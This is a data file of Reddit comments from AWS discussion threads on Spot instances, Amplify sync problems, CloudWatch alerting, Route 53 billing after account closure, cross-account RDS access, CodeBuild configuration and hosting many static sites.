g7xdumv,j688u5,"It is ok to kill the instance. For about 10 minutes. More than that and they get twitchy. They don't really need to, but you know users. I reckon they hit services they don't need for an excuse to complain. Downtime of up to half an hour is fine. I could literally run this without any automation.

But Normally the ASG brings it back in short order, it's done it 3 or 4 more times this afternoon without anyone noticing.",1.0
g7xknat,j688u5,"I'll assume you've chosen a Spot instance to save money and that this single instance should be running 24/7 (correct me if I'm wrong).

If that's correct, the best solution is purchasing either a Reserved Instance as the top commenter mentioned or perhaps an EC2 Instance Savings Plan (https://aws.amazon.com/savingsplans/faq/).

At this scale and with this use case, almost any effort you put into engineering around the inherent challenges of Spot instances will exceed the marginal savings of Spot pricing vs Reserved Instances or EC2 Instance Savings Plans.  You've probably already passed the break even point.  Seriously consider the TCO here.",2.0
g836t5j,j688u5,"It's an instance that needs to be available occasionally, with no particular availability stats between 0800 and 1800 M-F. A few minutes downtime is fine. Nobody ever noticed before. But once it is up to 20 mins outage, that is an anomaly that I'd like to prevent. If I can keep it to 10 mins, it'll be fine.

I spent a couple of hours re-engineering my CF template to do spot fleet. Which was good learning. TCO $100 maybe. Cost of a month reservation $51, cost of spot for the same instance is so tiny I don't even know. But within 2-3 months it is paying for itself.",1.0
g83rdwy,j688u5,"If it's not needed 24/7 and there's no real SLA, perhaps the trade-offs of Spot interruption aren't imbalanced.  But if cost is really a driver here it's worth doing the math.

Right now in London hourly m5.large spot pricing is $0.0333.  On demand is $0.1110 and a 1 year no-upfront RI is $0.070.  The savings plan hourly rate is the same as RI but with more flexibility.

The spot rate for a month would be around $24.31, the no upfront 1 year RI/SP is $51, so you save $26.69 a month.  Over 6 months that's $160.14.

Setting aside your own productivity costs (though I agree that learning something new has value), what has it cost the users over that six month span whenever the instance has been down?  If it costs all of them in aggregate less than $160, perhaps the math justifies living with Spot interruptions.  In most business scenarios I would expect the user impact cost to outweigh the Spot savings of $160 over 6 months, but I don't know the nuance of your particular use case.  If this is just a hobby project, I'd choose Spot too.",1.0
g7wxsxa,j688u5,"Diversifying your fleet will allow more Spot requests to be fulfilled. I'm not entirely sure what the behavior is when it tries to launch, I think it will test capacity down the list each time.

There will absolutely be days where you won't get spot capacity, though. This is not a good use case for Spot.",1.0
g7xenrb,j688u5,"No capacity across multiple zones and instance types?? We've been running for about 6 months and only had a few shutdowns, and then it was able to start in the other zone. 

When it doesn't keep blindly using the same zone that didn't work last time, it restarts it in a few minutes and it's all fine.",1.0
g7ya2gk,j688u5,"Yes. There is no guarantee spot availability will be there. I've seen plenty of situations where c5.xlarge through 4xlarge were unavailable in US-East-1 for spot. 

Spot is excess capacity. At times of high demand, spot availability can dry up.",1.0
g7x41bl,j688u5,"ASG set as capacity-optimized works the best

say you want a c5.large in resources your spot pool can be: c5.large, c5a.large, c5ad.large, c5d.large, m5a.large, m5ad.large, m5.large

you could use c4/m4 as well but they don't have as great networking

also having more AZs helps.",1.0
g7xjbdg,j67bfd,"I call it names and tell it it’s just fancy PostgreSQL.

Oh, _that_ kind of “mock”.",8.0
g7wkc16,j67bfd,"To some extent you can run a postgres instance locally on your machine, if you're just running queries and stuff.

As far as data loading or anything more advanced, you'll need to spin up a cluster.",6.0
g7xq49w,j65w1g,I'm in the same boat. Having trouble getting DataStore to sync changes with Appsync and be able to initialize data from AppSync to local storage. Following this thread...,2.0
g7xrseb,j65w1g,"I've been having similar issues as well in Swift:

I've been using the `Amplify.DataStore.save` method with my entity being successfully updated, but the DynamoDb equivalent entity does not get updated. I'm not sure if I have to add any additional arguments to `Amplify.DataStore.save`

example: 
```
let user = // Get user from amplify query
user.name = ""New Name""
Amplify.DataStore.save(user) { result in ...
```

Is there some type of additional arguments I need to add? The docs aren't very transparent when comes to actually getting the data to sync.",2.0
g7zqtag,j65w1g,I’d love to know this also...!,1.0
g88xtph,j65w1g,"You don't need to pass anything additional to `save`.

If you've already followed [this section](https://docs.amplify.aws/lib/datastore/sync/q/platform/ios) of the Amplify iOS docs, I'd suggest opening a new GitHub issue in the [Amplify iOS repo](https://github.com/aws-amplify/amplify-ios/issues).",1.0
g88wy8h,j65w1g,"Have you tried enabling logging?
```
Amplify.Logger.LOG_LEVEL = 'DEBUG'
```
I would start there and look for any errors, particularly those involving subscriptions or authentication. 
Does DataStore emit a ""ready"" event?

Also, I'd suggest opening a GitHub issue [here](https://github.com/aws-amplify/amplify-js/issues)",2.0
g8916e2,j65w1g,Thanks I’ll take a look!,1.0
g7x98c7,j65w1g,"It might help people troubleshoot your problem if you were a bit more specific with what wasn’t working. The guide mentions running _amplify status_ followed by _amplify push_ as well as configuring your aws credentials correctly for amplify. Which of those steps is not working for you?

I haven’t actually used amplify before, but being more specific with what’s going wrong will help people find and answer for you!",1.0
g7xay4p,j65w1g,So I’ve done status and push. It’s working with local storage but not being pushed to dynamodb,1.0
g7xoqjf,j65w1g,do you have a dynamodb table for posts? have you pushed your resources?,1.0
g7xq5m5,j65w1g,Yes pushed and have the tables in Dynamo DB generated in AWS sync,1.0
g7xtytx,j65w1g,you have resolvers defined? are you able to make a query in the console?,1.0
g7zqqr3,j65w1g,Yes when using the graphqloperation from the API I can successfully write and read data to the cloud but when using datastore I only ever get local changes written,1.0
g7xqyvd,j65w1g,"run amplify update api 
Make sure you enable data store and set a merge resolution policy",1.0
g7zqsbq,j65w1g,So I did this and set it to auto merge but still nothing :(,1.0
g7zr04o,j65w1g,"If the amplify push succeeded right after I’m not sure .
But make sure to run amplify-modelgen as well since it won’t work with outdated generated models",1.0
g8061r1,j65w1g,"Yeah I have done this, as far as I'm aware I've followed all the steps but with no success. For now I'm just going to use API and loose the offline capability :(",1.0
g808efy,j65w1g,I ended up ditching data store and I’m now using react-query,2.0
g81ksl7,j65w1g,I’ll take a look into this. Thanks!,1.0
g7wdhmo,j65mgp,Couldn’t you do a CloudWatch Alert on a custom CloudWatch metric?,3.0
g7wbw3c,j65mgp,"You could log the errors, then have that error trigger a Cloudwatch  Event.  
  
https://aws.amazon.com/about-aws/whats-new/2019/06/amazon-cloudwatch-events-now-supports-amazon-cloudwatch-logs-target-tagging-cloudwatch-events-rules/",2.0
g7wcbx7,j65mgp,"I just finished [Stephane Maark's DevOps/Cloudformation Section](https://www.udemy.com/course/aws-certified-developer-associate-dva-c01/learn/lecture/12203038#overview)  
  
In short, it explains that you can either send errors to Cloudwatch via API or have the Cloudwatch Agent scan logs.  
  
If you're doing retroactive log checking, and logs are CSV, you can use Athena to parse huge logs like SQL.",1.0
g7wrmq1,j65mgp,"The CIS AWS benchmark uses CloudWatch metrics filters to trigger alarms. Here's the expression that requires for the unauthorized API call alert:

    ""Filter = {(($.errorCode=""UnauthorizedOperation"") || ($.errorCode=""AccessDenied"")) || (($.sourceIPAddress!=""delivery.logs.amazonaws.com"") || ($.eventName!=""HeadBucket""))}""

https://workbench.cisecurity.org/sections/43741/recommendations/115408

It sounds like what you'd want would be similar — use a subscription filter and send those events to something like Kinesis, Lambda, etc.",2.0
g7t5qwj,j5nh4w,"Recover the account.  We had the same thing happen.  Even though it's deleted you can still log in and make support requests to delete the route53 registrations you have. You just need to get access, so if you don't have access you'll have to go through the account recovery process.",36.0
g7t6zvt,j5nh4w,"Just left a case, now to wait and see the response. Thank you, I was really freaking out because this payment had messed up a couple of my plans but this answer has pulled me out of the panic.",11.0
g7uo8ie,j5nh4w,"you should ask for a refund, if you're terminating an account, it should be on them to make sure that no more resources are being provided, and if they are, then you shouldn't be billed for them.",11.0
g7v3t57,j5nh4w,Account deletion really should revoke everything...,3.0
g7u0xc4,j5nh4w,fyi: [https://github.com/rebuy-de/aws-nuke](https://github.com/rebuy-de/aws-nuke),10.0
g7vbddh,j5nh4w,"Thanks, I'll keep it in mind.",1.0
g7td5xn,j5nh4w,In what universe does AWS think it is correct to leave billable services activated after an account is deleted?  Smh,40.0
g7tmlga,j5nh4w,It’s not immediately deleted. An account shutdown goes into deactivated while you can still login to make support tickets and recover. It guards against massive accidents,22.0
g7tt55x,j5nh4w,"Or, you know, not letting someone delete their account if they have active services is another way to prevent massive accidents",21.0
g7u2inb,j5nh4w,This. It would make a lot more sense for a computer to report that it can't terminate X for Y reason. Foresight and reporting is what makes great customer service.,7.0
g7v1w54,j5nh4w,"Ok, you be the guy on the phone with the rich CEO of some bullshit company telling him that theres no way to recover his data because he confirmed the deletion by clicking ok 3x.  
EDIT: aww look newbcakes who have never had to actually have those hard coversations are downvoting.",0.0
g7w9ns3,j5nh4w,"I've walked into some situations. Not for big CEOs. More small business. Biggest ""CEO"" I've dealt with with the Commissioner of IT for NYPD. After that, a dude worth $250m. And after that, small business, Micro Business, and PMs.  
  
The closest to this were people running Quickbooks with no backup. There was a LAMP server, but it wasn't critical for 1 client.",1.0
g7wf3ih,j5nh4w,"Now, imagine you're an employee of AWS, and these guys oops away their entire infrastructure. Do you really want to deal with that more than a few times? Some irrationally angry entitled person screaming at you over the phone about how you're going to ruin them and their business, and their lawyers are going to eat you alive blahblahblahbalha... For something THEY did. I bet after like the first 30, AWS decided they needed to do something different.",1.0
g7wfun7,j5nh4w,"Here's the thing. Little men using big threats is not a new thing. Existed before computers.  
  
A lot of us have gotten use to seeing people trying to hire someone to solve a problem they don't understand. And yes, they are angry and are yelling at you because they fully understand logically they screwed up, but don't have a hold of their emotions.  
  
In a perfect world, we would never need to deal with people like this. In reality, a lot of things that should be well secured are merely tape and bubblegum.",1.0
g7wgcl2,j5nh4w,"100% agreed. But for the mental well-being, and time management of your first line employees, you take care of that.  
  
Now, if you want something to be mad about... Azure... Jesus Christ. If I delete the VM, obviously I want to delete the associated virtual disk, virtual NIC, public IP, and security group. Even if I wanted to keep the random IP, give me a check box or something... dont just leave all that shit assigned and make the VM itself no longer pop up in the instances page.",1.0
g7v2o7p,j5nh4w,That's how virtually every other service works,-1.0
g7vg2yt,j5nh4w,"What's does an active service mean in this context? Does the default VPC count as a service? What about stuff like the log groups? Or what about your cloudwatch metrics? What about configuration for AWS config to store on a cross account bucket? If I needed to delete all of these little things to shut down an account, I might go crazy too.",1.0
g7ui508,j5nh4w,"So this has to do with the nature of Route53.  Unlike say EC2, where everything that is created is done within the context of the ""account"", Route53 is affecting things outside of the account.  Specifically DNS.  So when you delete your account it will free everything that exists exclusively within the account.  With Route53 AWS has made a choice, and I believe the right one, to not delete the registered domain names without your express consent.  The alternative would be for people to unintentionally loose control of their domain names.  So the reservation is maintained until they get a request to transfer it or delete it.",9.0
g7v5twr,j5nh4w,This makes perfect sense; they should just do a better job telling you this at the time of deleting account and or later communication.,1.0
g7w2z4l,j5nh4w,People would probably read that as well as they read the Terms and Conditions of every website they sign up for.,1.0
g7u61il,j5nh4w,"As a general rule, AWS doesn't. Route53 is one of only two special exception cases I'm aware of (a monthly subscription for a reserved instance is the other one), and AWS is pretty clear and warns that unlike other services, R53 charges won't be cancelled even after account closure: https://docs.aws.amazon.com/awsaccountbilling/latest/aboutv2/close-account.html#closure-domains

As for *why* Route53 is an exception, I don't exactly know. My guess is that it has something to do with the danger of accidentally losing a domain name registration (which could result in your domain being picked up by a squatter and held for ransom, or worse).",6.0
g7tfhep,j5nh4w,"I think that's ok. Imagine a person was leaving a company, you wouldn't want that to trigger the whole workload to be deactivated. 

I do think though that they need to make it easier to cancel everything, in every region in one go",9.0
g7tfyqm,j5nh4w,Is this something companies do?  Have all their services tied to an employee’s AWS account?,13.0
g7tgb7m,j5nh4w,"Do they? Sure. But they shouldn't. In my experience most large companies definitely don't. This is what IAM is for...

If this is why, it's a bad reason - AWS shouldn't be engineering for the bad practice minority at the risk of overbilling the majority.",9.0
g7th7ry,j5nh4w,[deleted],-4.0
g7u5mqh,j5nh4w,"&gt; A service created by that employee? Probably. That's the employee's choice, and it's right to not micro-manage employees.

It is absolutely OK for the company to make you use a company issued AWS account for any work they're paying you for. I have personal AWS/Azure/GCP accounts that I use for my own education/experimentation, but any time I've needed to do anything with a cloud service for work it was using an account created in a company owned subscription. I do not get a choice in that since personal accounts for anything work related is expressly forbidden, and that's the way it should be.",5.0
g7uhuda,j5nh4w,[deleted],3.0
g7v8867,j5nh4w,"Yeah, but that subscription should still exist unless the entire project was cancelled.",1.0
g7ui0tx,j5nh4w,"I understood the above comment to mean that it was the employee’s company-owned account rather than, say, a designated prod account or something like that. Not that they were using their personal account to host company services",1.0
g7tm7nz,j5nh4w,"If an AWS account is deleted, why would you expect any services in that account to stay active?",3.0
g7tqsvf,j5nh4w,If somebody quits their job do you remove all of the work they've contributed?,2.0
g7ttj1v,j5nh4w,"The root level account shouldn’t be owned by one person, instead a select few. The resources should be done by infrastructure as code anyway",5.0
g7ucc4t,j5nh4w,"No one's talking about IAM accounts here. If someone quits, their IAM account would be deactivated, but that has nothing to do with the AWS root account that the resources belong to.",0.0
g7vr2n9,j5nh4w,So you think if the root account is deleted then the whole infrastructure should be deleted? Sounds like a huge risk.,1.0
g7u8cl1,j5nh4w,Ahh yeah,1.0
g7v0knw,j5nh4w,"Customer: deletes account

Amazon: so I see you’ve opted for the lifetime plan",4.0
g7u8387,j5nh4w,How recently did you delete the account? AWS doesn’t immeadiately delete all services when an account is closed since the account needs to be recoverable. The exact number of days depends on juristiction and things like GDPR protection level of the service,2.0
g7vb88v,j5nh4w,"I closed it less than a month ago, and I know that.

The problem was accessing it to turn off the Route 53 Service.

I already put a case in like someone else told me to.",1.0
g7vcbko,j5nh4w,"Yeah, AWS explicitly doesn't delete accounts that include outside services for at least 30 days so people can recover your account. It should be completely deleted after 30 days, and all artifacts from the account should be deleted after a year.",1.0
g7u4a35,j5nh4w,"If all else fails, you can contact your bank and place a stop charges order on the merchant. You can explain to them exactly what's going on, what steps you've taken to remediate, and they will resolve the issue.",2.0
g7u6nhk,j5nh4w,Don't some companies blacklist you if you initiate a chargeback/stop charges without at least trying to resolve any billing issues with them first?,1.0
g7ubwkv,j5nh4w,"Yes they do, hence the ""if all else fails"" lead-in. I would exhaust your other options first, but if they simply will not stop billing you, the financial route does exist.",2.0
g7u78b4,j5nh4w,"Yea... like the top commenter said, chargebacks should truly be the last, last option if literally all else fails. When you do a chargeback your bank is going to first reach out to the merchant and ask why the merchant is billing. If the merchant can provide documentation that they did provide a service that should be paid for (which in the case of AWS is very likely), then your bank is *not* going to reverse the charges, so now not only will you have to pay for the services, you have also pissed off both the merchant *and* your bank. Enough failed chargebacks and your bank might close your account, so especially don't go around using chargebacks on everything.",1.0
g7uc729,j5nh4w,"FWIW I have encountered a similar situation, in which a service kept charging us despite not having an account. I issued a stop charge on the merchant and it ended up in a four-way phone call between me, the bank, the billing merchant and the service billing us.

I got to witness a particularly satisfying talk down from the service's merchant about properly implementing their policies but your satisfaction may vary.",1.0
g7vh61u,j5nh4w,"You shouldn't be worried. AWS support is good and they will get back to you in 24 hours. 

They won't allow you to access any other services when the account is terminated but if I am not wrong, you will still be able to login using your credentials and there is a link to raise support tickets.

In the early days, they used to waive off smaller bills that were accrued by developer mistakes. This is from my own personal experience. Not sure how they handle such cases now.",1.0
g7vy06k,j5nh4w,"Yup, already gotten back to me, once I'm home I'll read the e-mail more closely.",1.0
g7ubxe6,j5nh4w,Did you delete the resources before you set your account for deletion?  There is a 90-day period where you will still be billed for your resources before the account gets destroyed.  This is to allow customers to re-activate their account should they desire.,0.0
g7vb239,j5nh4w,"That's the problem, I thought I did, but turns out I forgot to deactivate route 53. I put a case in yesterday for the reopening of the account.",1.0
g7wpsx8,j5nh4w,"Yeah, that will do it.  You can re-open it, deactivate all resources, then re-close the account.",1.0
g7w2ex5,j64g2i,"Hello! If all you are trying to do is connect to that RDS instance, you can simply set up what is called a VPC peering connection between the VPC in the account you wish to connect from to the VPC that the RDS instance is contained in. (Make sure you update the routing tables). Then you can connect to the RDS instance directly.

https://docs.aws.amazon.com/vpc/latest/peering/create-vpc-peering-connection.html",1.0
g7wbyjq,j64g2i,"Thank you very much for your answer! VPC peering was one of the option, based on what I read here: [https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/USER\_VPC.Scenarios.html](https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/USER_VPC.Scenarios.html)

But I didn't know whether to create an EC2 instance for that would be the most cost-efficient way for this task. It was confusing for me to find out how it would affect the billing to connect a specific EC2 instance to the RDS instance in the other account.

However, since the database in RDS will be updated a lot and we need to generate snapshots for S3 frequently, I think this is the most efficient way.

Thank you very much again!",1.0
g7w6kqx,j64g2i,Can you use DMS to replicate the data across accounts from RDS to S3?,1.0
g7wc7sz,j64g2i,"I guess I can, but since the purpose is only to have the snapshots in S3, I thought that instead of migrating the database in each update that it receive, it would be more efficient to create and export the snapshots directly for each update. Thank you very much!",1.0
g7w018j,j63sbr,"You have a lot of options, but an approach that is reasonable and close to your suggestions would be to build a JSON file with whatever variables you need then import that JSON file into your JS to populate the variables.  Ideally, any variables that need to be set dynamically should take place in that JSON file, and this gives you some control over how your JS handles the variables (i.e., if a variable doesn't exist, throw a specific error or use a default value, etc.).  You can set the variables based on the env vars set for the build project.",2.0
g7y54nm,j63sbr,"Hey, these suggestions helped me out. Thanks a lot!",2.0
g7w0alr,j63sbr,"A) hackish way: capture the output of the git-branch command and write logic around that.

https://www.techiedelight.com/determine-current-branch-name-git/

B) Don’t use CodeBuild directly. Use two CodePipelines to trigger the correct CodeBuild project based on the branch. CodePipeline can pass environment variables to CodeBuild. 

C) Do you really need config in config files? Are your dev and prod environments  in separate accounts? If so, just reference a hard coded Parameter Store  value from your code. The value will be different in each account.",1.0
g7w3klx,j63sbr,"What's your opinion on triggering CodeBuild through a Lambda function, whose trigger is the CodeCommit?   


i.e: commit to CodeCommit, trigger lambda function, lambda function has code to start CodeBuild",1.0
g7w3td7,j63sbr,"Why? Just use CodePipeline.

Get Source -&gt; run CodeBuild.",1.0
g7w3wpy,j63sbr,"I was just wondering. I'm trying to keep costs as low as possible and within the free tier where possible. I've already got 1 active CodePipeline for a different project, and the free tier only gives one.",1.0
g7w4220,j63sbr,I guess you could. But you realize it’s $1 a month per pipeline?,1.0
g7y524t,j63sbr,Yeah Im aware of how cheap it can be. But I'm thinking if I have that attitude with all AWS services the bill adds up...if that makes sense?,1.0
g7y5ufz,j63sbr,"I’m really all over the place with how I feel about this. 

On one hand, I think making a small investment and spending a little money and stepping  outside of the free tier to learn something that can vastly increase your skillset is worth it. 

On the other hand, I realize that cost is an issue and sometimes learning how to do things frugally can be a skill in and of itself. 

I also feel a little icky suggesting someone should spend their own money to learn instead of making do with the free tier when I never did. I’ve gotten all my experience at the company’s expense and now I work for the one company in the world that never has to worry about an AWS bill.

So take whatever I say with a huge lump of salt.....",1.0
g7ztb0i,j63sbr,"Yeah, I agree that some money will have to be spent to learn more areas of AWS. Not everything is included in the free tier, and even for the services that are, they can be limited. 

But in the case of CodeBuild/Lambda versus CodePipeline, the goal is to automate deployment to the S3 bucket website. By using CodeCommit, Lambda and CodeBuild, I can achieve the same automated functionality of CodePipeline (at least for my small and basic use case).

I suppose in other areas where alternatives aren't so straight forward, spending a little bit of money would be sensible.",1.0
g7w0gtu,j63sbr,"In a project of mine, we use a Gulp build to process the pre-build JS files. In the root html file (of a spa app) we have data attr on the \`body\` element with lodash template inside of the quotes like this.

`&lt;body data-clientsappurl=""&lt;%= CLIENTS_APP_URL %&gt;"" data-heapproject=""&lt;%= HEAP_PROJECT %&gt;""&gt;`

Then at deploy-time, the html file is processed by Gulp, which is able to fetch the config from s3, or where ever you'd have them stored, and replace the values there in the html file. When your app bootstraps have it read those out of the HTML and provide the values to the app.",1.0
g7xictq,j63ior,"Yes, you can use presigned URLs or even browser based POST uploads for that.

See https://docs.aws.amazon.com/AmazonS3/latest/API/sigv4-UsingHTTPPOST.html",1.0
g7w8rpc,j63ior,If you mean 'upload without using a s3-aware client' then you'd need an intermediate component to make that translation. You can have public-write buckets but the client still has to speak S3.,0.0
g7xihhl,j63ior,"Nope. Never proxy S3 requests though a intermediate instance. Takes longer and doubles data transfer costs.

There are alternatives to it.",1.0
g7xo1qz,j63ior,"My point was there is no way to grant mundane browsers write access to S3 without something smart in play.  S3 doesn't offer a native 'upload here' page for browsers that aren't s3 aware (or logged in to the console). [https://docs.aws.amazon.com/AmazonS3/latest/API/sigv4-UsingHTTPPOST.html#sigv4-UsingHTTPPOST-how-to](https://docs.aws.amazon.com/AmazonS3/latest/API/sigv4-UsingHTTPPOST.html#sigv4-UsingHTTPPOST-how-to) is the right answer, but you'd need for example an api gateway and lambda to generate the proper post URL, otherwise you have to embed creds in a client-side javascript which is a bad idea.",0.0
g7vtae9,j62rue,"If cutting costs is your priority, look into pay-as-you-go services (serverless stuff, AWS Lambda, Amazon DynamoDB, Amazon S3). This shouldn't be too hard if since your app won't be to complex in the beginning. For the Frontend/Android you can look into AWS Amplify, it has everything to start fast [https://docs.amplify.aws/](https://docs.amplify.aws/)",7.0
g7vwsng,j62rue,"Hey there,

I really think you can get along with a single ec2 (choose an M5 instance so you don't have problem with the bursts of the T3)

You can have  [https://doc.traefik.io/traefik/](https://doc.traefik.io/traefik/) inside it to orchestrate your DB (and you won't have to pay the rds price) and your app. 

You can even leave room for a Redis in there so you have caching capacity.

Send all your flat files to s3 to reduce your storage and you are good to go :) 

Hopefully this helps :)",2.0
g7vzyo6,j62rue,"Elastic Beanstalk?

Maybe a few tweaks here are there, but a great option if you want to spend your time on your application and not the infrastructure.",2.0
g7w0new,j62rue,"1. Elastic Beanstalk is the easiest method. But not necessarily cheapest. It should be cheap enough. 

2. Amplify w/DynamoDB. Stupid simple. But you need to know your access patterns in advance. 

3. Amplify w/Aurora Mysql - more manual work and you will need to know how to work with VPCs. You really want your database to be inside a VPC.",2.0
g7w8t05,j62rue,"I would look at what you can do with serverless, so you don't have to over-provision or pay for stuff you don't need.

You can host both an API and a simple web app using API gateway and an S3 bucket, then pick your serverless db from the myriad of options, from a simple key value pair (dynamo) to full scaling SQL (aroura).

If you need more back end you can always use lambda functions to glue different bits together, assuming the API Gateway doesn't support it out of the box.",2.0
g7vqm31,j60ze6,"It can be done. 

You would need to build out your own orchestration tools to handle creating the s3/acm/cloudfront distributions for each site. 

Make sure you increase your aws service limits",3.0
g7vt2fo,j60ze6,"Thanks! Ok, so maybe it is the best way!",1.0
g7vw3lr,j60ze6,"using subject alternate names (SAN) on certificates you might be able to shard the infrastructure that terminates your ssl (you mention cloudfront there).

that would reduce the number of distributions but then you'd have to deal with routing requests to the correct origin.

for a price you can pay for a product like cloudflare ssl for saas [https://www.cloudflare.com/en-gb/ssl-for-saas-providers/](https://www.cloudflare.com/en-gb/ssl-for-saas-providers/) that might do this more naturally.",3.0
g7w9ja9,j60ze6,"Yeah, I actually talked to Cloudflares sales people, but it was a bit over our budget at the time... And it felt a bit overpriced if it was doable with ACM and CloudFront for instance.",1.0
g7w1um6,j60ze6,"When in doubt, give the hard part to someone else if you can. Using an orchestration tool like CloudFormation or Terraform it’s pretty easy to crank out buckets, distributions, and certificates and keep them up to date. I typically use Terraform with a data source (even a CSV file) for this kind of task where you’re just looping creating a number of resources for every entry. 

The big question I’d ask: how are you getting those certificates validated? ACM works best with DNS validation but you’d want to automate that process for thousands of sites.",2.0
g7w9qz3,j60ze6,That is a very good point! The validation process isn’t that smooth...,1.0
g7wc23x,j60ze6,It’s definitely by and for people who automate everything. I am of that mindset but it can be challenging in an enterprise environment where DNS is locked down behind an ossified process. Hopefully the number of hostnames here is enough to force modern practice or will allow wildcards.,2.0
g7wkj3x,j60ze6,Basically one domain per site unfortunately...,1.0
g7xk3gk,j60ze6,You definitely want an API and automation since that’ll be a lot of records to update if you change the architecture,2.0
g7welez,j60ze6,"Put every site inside its custom folder (on EFS or ec2 or likewise).
Put caddy in front of it.
Let caddy handle the SSL certificate stuff for you.
Profit?!",2.0
g7wkdts,j60ze6,"Thanks, probably the simplest way to do it! But then we don’t get the edge caching and have to handle the scaling...",2.0
g7wlhcg,j60ze6,Didn’t know about Caddy before! Looks awesome! Thanks!,1.0
g7wnalv,j60ze6,"We hosted a lot (hundreds ) of marketing sites on S3 it is very easy. Look at some of the static site generators like hugo and automate the setup with a Terraform module and deploying each site can be a very quick. 

Other comments are right if there are thousands of site you will definitely need to raise the limits and I think you'll hit the hard limits so would need to spread the sites over a couple of accounts but that is easy to manage with AWS orgs now.",2.0
g7vcmmo,j5yk5f,"I haven't had a lot of difficulty adding new access patterns to existing data. The main issue I'm afraid of is hitting any service limited (e.g. number of GSIs), but haven't yet.

https://www.dynamodbbook.com/ is totally worth it if you're going to be using DDB _for realz_. One point that I liked was adding a version field on your items' metadata, so that you can script operations for specific versions of items e.g. doing migrations for new access patterns.",2.0
g7vcsag,j5yk5f,Thank you for the reply. I'm trying to add new access patterns without adding a lot of GSIs  (for cost reasons). One of the access patterns that I'm having difficulty with is a query condition with many filter conditions as well as sorting,2.0
g7vods5,j5yk5f,"Hard to give specifics without all the details, but I would remind you not to be afraid to duplicate data so that you can easily achieve your access pattern goals.

If you've got a particularly thorny problem, then pitch your scenario to Rick Houlihan, the *DDB Modelling God* who also runs an [Office Hours](https://www.youtube.com/playlist?list=PLJo-rJlep0EDiOJaqZV0FjO0Ts3CmKy-W) (that's the list of past sessions on YT, but he streams them live on Twitch).

EDIT: Now without Twitter link to Rick, since the bot doesn't like that",1.0
g7vcueo,j5yk5f,Can you give example on scripting operations for specific version?,1.0
g7vwmk6,j5yhzy,[https://docs.aws.amazon.com/eventbridge/latest/userguide/calculate-putevents-entry-size.html](https://docs.aws.amazon.com/eventbridge/latest/userguide/calculate-putevents-entry-size.html),1.0
g7vhgq3,j5xkqv,"Some components are harder than others, but in general:
Terraform
Separate prod and staging accounts.
Test changes in staging first then promote the changes
Test and version your amis and use them in your terraform.  (Packer)",3.0
g7vp876,j5xkqv,I think you failed to answer OPs question. He is asking about development environments. Not test/staging environments,1.0
g7viyds,j5xkqv,"We can create Organization accounts when we need them and add whatever infrastructure we need, provided that we're turning things off when we're not using them - like overnight. There are some service control policies that give us some guardrails in terms of which services we don't get to use in our accounts.

The ""turn it off"" policy gives us a lot of motivation to automate all the deployment stuff. Because of this, we're heavily invested in CDK to pump out CloudFormation. No real complaints. It's very productive. Also it's pretty fun to try to blow your system up on dev however and whenever you want without it affecting anyone else.

Promoting to pre production and production is driven by Code Pipeline and a bunch of automatic testing. Each environment is a set of different accounts. Production is locked down pretty good too.",2.0
g7wqy42,j5xkqv,"In the organization that I work with, we have separate test account for devs to play around, the one thing I really liked about this account is, resources are cleared every midnight, this this saves org lot of $$$ for irrelevant resources that dev has created, however, the downside is dev has to create a resource every morning again, since most of the devs use cf, it's not much of effort to do it every morning if you have to.",2.0
g7viyhn,j5xkqv,"I’ve only worked at two companies that developed on top of AWS over three years and they were polar opposites. 

- At a small company with around 20 developers in all where we used a lot of different AWS services. We had a single Dev account with that mirrored production. One developer was usually working with one feature of the monolith or of the microservice so no one stepped on each other’s toes. You want to do that anyway to help prevent git merge conflicts. This method was cheap, easy to maintain, and didn’t require complex permissions or guard rails around who could create what. 

Of course new resources that were needed were created with CloudFormation. 

- Now I work in ProServe at the only company in the world that never has to worry about being billed for AWS resources. I’ve seen every one share a single account, and I have personally written a CFn template that pulled from one central CodeCommit repo and deployed resources to each developer’s own account. 

But most companies aren’t going to allow any developer  to just set up basically anything in their own account with very wide guardrails. 

Even AWS will look at me askance if I order a snowmobile to my house.....

- Of course the middle option is to use local stack when you can.",1.0
g7vkmjx,j5xkqv,"We aim to implement things with abstractions that allow them to be developed locally, but when devs needs real AWS resources, we just give them their own AWS account. Organizations makes it trivial to create accounts for everyone. This ensures that no one dirties up any of the other accounts with temporary resources, we can track spending by individual, and off-boarding is more or less a matter of just deleting the account.",1.0
g7vwxbp,j5xkqv,"This

Also the op can use CDK on code pipeline to replicate the prod environment or a slice of the prod stack.",1.0
g7vmw8d,j5xkqv,"Bookmark. Interesting and trying to understand more details. Be it with using AWS Codepipeline or deploy or external tools. Mostly like, how a large company going with AWS and what tools they may be using :)",1.0
g7uujaq,j5wgfi,"The catch is that, this is against their ToS. 

**51.3.** You may not use Amazon Lightsail in a manner intended to **avoid incurring data fees from other Services** (e.g., proxying network traffic from Services to the public internet or other destinations or excessive data processing through load balancing or content delivery network (CDN) Services as described in the [Documentation](https://lightsail.aws.amazon.com/ls/docs/en_us/articles/amazon-lightsail-frequently-asked-questions-faq#cdn-distribution-intended-use)), and if you do, we may throttle or suspend your data services or suspend your account.

So basically, they will throttle all of ur lightsail instances and render your scheme useless and you have two dozens of these $5 instances added to your bill.",7.0
g7uv1fu,j5wgfi,"And that's exactly what I was imagining might exist.

Thanks!",5.0
g7uv7eq,j5wgfi,"Can confirm.  Gets asked all the time.  No, Lightsail != DT proxy.  Automation catches you very quickly.  Don't bother even trying.  Not what Lightsail is for.",2.0
g7uxz0z,j5wgfi,"This used to work, but as others have referred to you will be throttled automatically.

One way around it is to load your Lightsail instances with the S3 data, then wait a few days to download it and then do it all again. 

This of course takes developer resources to do and may not be worth someone’s time in order to avoid a few hundred dollar cost.

Have you looked into getting a snowball export of your data? $0.03 per GB",2.0
g7uvd53,j5w67k,"Assuming you're using just S3 and not CloudFront+S3. All you need to do is create a new s3 bucket with the new domain name and then use the AWS CLI tool and run a AWS s3 sync between the buckets.

The quickest way to update a new website I found is by using https://github.com/formkiq/parima.",3.0
g7v08uj,j5w67k,"Unless I'm missing something, just point your new domain to the existing bucket. You could have (theoretically) endless domain names pointing to the same website.",1.0
g7vhwlu,j5w67k,"The domain name has to match the bucket name exactly. So it's a 1:1 relationship, not many:1",1.0
g7w1n2t,j5w67k,"Oh right, I forgot about that.  Thanks",1.0
g7uqs93,j5uch5,"Wow, interesting that you posted this today. Our team *just* discussed building this exact thing.

Great read 👌",6.0
